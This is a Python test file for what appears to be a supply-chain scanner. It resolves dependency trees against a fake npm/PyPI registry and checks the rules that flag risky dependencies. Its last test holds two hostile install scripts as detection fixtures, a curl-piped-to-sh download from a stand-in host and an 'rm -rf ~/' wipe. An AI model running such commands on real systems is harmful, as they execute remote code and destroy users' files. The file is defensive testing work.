"""Dependency trees (supply/deps.py) against a fake registry, and the rules that judge them."""

import io
import zipfile
from datetime import UTC, datetime, timedelta
from typing import Any

import anyio

from mcpiranha.core.launch import PackageRef
from mcpiranha.core.models import (
    Launch,
    Origin,
    PackageMeta,
    ReleaseInfo,
    ServerSnapshot,
    Severity,
    Vulnerability,
)
from mcpiranha.core.pipeline import scan
from mcpiranha.rules import load_rules
from mcpiranha.source import script_hits
from mcpiranha.supply import enrich
from mcpiranha.supply.deps import python_requires, resolve

NOW = datetime(2026, 10, 23, tzinfo=UTC)
NPM = "https://registry.npmjs.org"
SC_RULES = [r for r in load_rules(plugins=False) if r.id in ("MCP-SC-007", "MCP-SC-008",
                                                                 "MCP-SC-009")]  # fmt: skip


def _packument(name: str, releases: dict[str, dict[str, Any]]) -> dict[str, Any]:
    versions = {v: {"name": name, "version": v, "_npmUser": {"name": "alice"},
                    "dist": {"tarball": f"{NPM}/{name}/-/{v}.tgz", "integrity": "sha512-x"},
                    **extra} for v, extra in releases.items()}  # fmt: skip
    last = list(releases)[-1]
    return {"dist-tags": {"latest": last}, "versions": versions,
            "time": {"created": "2020-01-01T00:00:00Z", **{v: "2021-01-01T00:00:00Z"
                                                          for v in releases}}}  # fmt: skip


class FakeRegistry:
    def __init__(self, packuments: dict[str, dict[str, Any]]) -> None:
        self.packuments = packuments
        self.archives: dict[str, bytes] = {}
        self.osv: dict[str, list[dict[str, Any]]] = {}

    async def get(self, url: str, headers: dict[str, str]) -> Any:
        if url.startswith(f"{NPM}/"):
            return self.packuments.get(url.removeprefix(f"{NPM}/").replace("%2f", "/"))
        if "/vulns/" in url:
            return {"summary": "x", "database_specific": {"severity": "HIGH"}}
        return None

    async def post(self, url: str, body: Any) -> Any:
        names = [q["package"]["name"] for q in body["queries"]]
        return {"results": [{"vulns": self.osv.get(n, [])} for n in names]}

    async def archive(self, url: str, expected_hash: str) -> bytes:
        return self.archives[url]


TREE = {
    "server": _packument("server", {"1.0.0": {"dependencies": {
        "lib": "^1.0.0", "alias-cjs": "npm:real-pkg@^2.0.0", "from-git": "github:x/y",
        "local": "file:../local", "ghost": "^1.0.0", "worker_threads": "^1.0.0"},
        "peerDependencies": {"peer": "^1.0.0", "optional-peer": "^1.0.0"},
        "peerDependenciesMeta": {"optional-peer": {"optional": True}}}}),
    "lib": _packument("lib", {"1.0.0": {}, "1.1.0": {"dependencies": {"leaf": "~3.0.0"}}}),
    "real-pkg": _packument("real-pkg", {"2.0.0": {}, "2.5.0": {}}),
    "peer": _packument("peer", {"1.2.0": {}}),
    "leaf": _packument("leaf", {"3.0.1": {"scripts": {"postinstall": "node setup.js"}}}),
}  # fmt: skip


def test_npm_tree_resolution() -> None:
    fake = FakeRegistry(TREE)
    root = PackageMeta(registry="npm", name="server", version="1.0.0",
                       requires=TREE["server"]["versions"]["1.0.0"]["dependencies"]
                       | {"peer": "^1.0.0"})  # fmt: skip
    ref = PackageRef("npm", "server", "1.0.0", "npx", 1)
    out = anyio.run(lambda: resolve(root, ref, fake.get, fake.archive))
    deps = {d.name: d for d in out.dependencies or []}
    assert set(deps) == {"lib", "real-pkg", "from-git", "ghost", "peer", "leaf"}  # no file:
    assert deps["lib"].version == "1.1.0" and deps["real-pkg"].version == "2.5.0"  # alias
    assert deps["leaf"].via == ["server", "lib"] and deps["leaf"].install_scripts
    assert deps["from-git"].external == "github:x/y"
    assert deps["ghost"].removed


def test_npm_requires_skip_optional_peers() -> None:
    from mcpiranha.supply.registry import npm_meta

    fake = FakeRegistry(TREE)
    meta = anyio.run(lambda: npm_meta(PackageRef("npm", "server", "1.0.0", "npx", 1), None,
                                      fake.get))  # fmt: skip
    assert "peer" in meta.requires and "optional-peer" not in meta.requires


def test_python_requires_markers_and_extras() -> None:
    metadata = (
        "Metadata-Version: 2.1\nName: srv\n"
        "Requires-Dist: httpx>=0.27\n"
        "Requires-Dist: pywin32; sys_platform == 'win32'\n"
        "Requires-Dist: tomli; python_version < '3.11'\n"
        "Requires-Dist: rich[jupyter]>=13; extra == 'pretty'\n"
        "Requires-Dist: tool @ https://example.invalid/tool.whl\n"
    )
    assert python_requires(metadata) == {
        "httpx": ">=0.27",
        "tool": "@ https://example.invalid/tool.whl",
    }
    with_extra = python_requires(metadata, frozenset({"pretty"}))
    assert with_extra["rich"] == "[jupyter]>=13"


def _wheel_with(requires: list[str]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as wheel:
        lines = "".join(f"Requires-Dist: {r}\n" for r in requires)
        wheel.writestr("srv-1.0.dist-info/METADATA", f"Metadata-Version: 2.1\nName: srv\n{lines}")
    return buffer.getvalue()


def test_pypi_root_requirements_come_from_its_wheel() -> None:
    fake = FakeRegistry({})
    fake.archives["https://files.example/srv-1.0-py3-none-any.whl"] = _wheel_with(["ghost>=1"])
    root = PackageMeta(registry="pypi", name="srv", version="1.0",
                       archive_url="https://files.example/srv-1.0-py3-none-any.whl",
                       archive_hash="sha256:x")  # fmt: skip
    out = anyio.run(lambda: resolve(root, PackageRef("pypi", "srv", "==1.0", "uvx", 1),
                                    fake.get, fake.archive))  # fmt: skip
    assert out.requires == {"ghost": ">=1"}
    [ghost] = out.dependencies or []
    assert ghost.removed and ghost.via == ["srv"]  # the fake index has no such project


def test_enrich_checks_dependencies_against_osv() -> None:
    fake = FakeRegistry(TREE)
    fake.osv = {"leaf": [{"id": "MAL-2026-1"}], "lib": [{"id": "GHSA-lib"}]}
    origin = Origin(kind="config", client="t", ref="s")
    snapshot = ServerSnapshot(id="t:s", name="s", origin=origin,
                              launch=Launch(transport="stdio", command="npx",
                                            args=["-y", "server@1.0.0"]),
                              tools_listed=False)  # fmt: skip
    [out], warnings = anyio.run(lambda: enrich([snapshot], http=fake))
    assert warnings == []
    assert out.package is not None
    deps = {d.name: d for d in out.package.dependencies or []}
    assert [v.id for v in deps["leaf"].vulnerabilities or []] == ["MAL-2026-1"]
    assert deps["leaf"].checked_at is not None
    assert deps["from-git"].vulnerabilities is None  # not asked: no version to ask about
    found = {(f.rule_id, f.severity) for f in scan([out], SC_RULES).findings}
    assert ("MCP-SC-007", Severity.CRITICAL) in found  # the malicious leaf
    assert ("MCP-SC-007", Severity.HIGH) in found  # lib's advisory
    assert ("MCP-SC-009", Severity.HIGH) in found  # ghost isn't on npm


def _rules_on(*deps: PackageMeta) -> dict[str, Severity]:
    root = PackageMeta(registry="npm", name="server", version="1.0.0", checked_at=NOW,
                       created_at=NOW - timedelta(days=900), dependencies=list(deps))  # fmt: skip
    origin = Origin(kind="config", client="t", ref="s")
    snapshot = ServerSnapshot(id="t:s", name="s", origin=origin,
                              launch=Launch(transport="stdio", command="npx",
                                            args=["-y", "server"]),
                              tools_listed=False, package=root)  # fmt: skip
    worst: dict[str, Severity] = {}
    for f in scan([snapshot], SC_RULES).findings:
        if f.rule_id not in worst or f.severity.rank > worst[f.rule_id].rank:
            worst[f.rule_id] = f.severity
    return worst


def _d(name: str, *, days_old: float = 400, **fields: Any) -> PackageMeta:
    """A dependency whose release is `days_old` days old."""
    return PackageMeta(registry="npm", name=name, version="1.0.0", via=["server"],
                       published_at=NOW - timedelta(days=days_old), **fields)  # fmt: skip


def test_dependency_install_scripts_are_low_unless_just_added() -> None:
    script = ["postinstall: node-gyp rebuild"]
    native: dict[str, Any] = {"install_scripts": script,
              "previous": ReleaseInfo(version="0.9.0", install_scripts=script)}  # fmt: skip
    assert _rules_on(_d("native", **native)) == {"MCP-SC-008": Severity.LOW}
    hijacked: dict[str, Any] = {"install_scripts": ["postinstall: node x.js"],
                "previous": ReleaseInfo(version="0.9.0")}  # fmt: skip
    assert _rules_on(_d("hijacked", days_old=2, **hijacked)) == {"MCP-SC-008": Severity.HIGH}
    # added a script a year ago and stayed up since: listed, not alarming
    assert _rules_on(_d("settled", **hijacked)) == {"MCP-SC-008": Severity.LOW}


def test_dependency_vulnerabilities_and_suspicion() -> None:
    vuln = [Vulnerability(id="GHSA-1", aliases=["CVE-2026-1"], severity=Severity.MEDIUM)]
    assert _rules_on(_d("old", vulnerabilities=vuln)) == {"MCP-SC-007": Severity.MEDIUM}
    assert _rules_on(_d("x", external="github:a/b")) == {"MCP-SC-009": Severity.MEDIUM}
    new_publisher: dict[str, Any] = {"publisher": "mallory", "earlier_publishers": ["alice"]}
    assert _rules_on(_d("x", days_old=2, **new_publisher)) == {"MCP-SC-009": Severity.MEDIUM}
    assert _rules_on(_d("x", **new_publisher)) == {}  # maintainers change all the time
    lost: dict[str, Any] = {
        "provenance": False,
        "previous": ReleaseInfo(version="0.9.0", provenance=True),
    }
    assert _rules_on(_d("x", days_old=2, **lost)) == {"MCP-SC-009": Severity.HIGH}
    assert _rules_on(_d("x", **lost)) == {}
    assert _rules_on(_d("x", created_at=NOW - timedelta(days=3))) == {"MCP-SC-009": Severity.MEDIUM}
    assert _rules_on(_d("fine", publisher="alice", earlier_publishers=["alice"])) == {}


def test_install_script_commands_are_judged_as_executed() -> None:
    meta = _d("evil", install_scripts=["postinstall: curl -s https://x.example.invalid/i.sh | sh",
                                       "preinstall: rm -rf ~/"])  # fmt: skip
    kinds = {h.kind for h in script_hits(meta, "evil@1.0.0/")}
    assert kinds == {"dynamic_code", "destructive"}
    assert script_hits(_d("ok", install_scripts=["install: node-gyp rebuild"]), "") == []
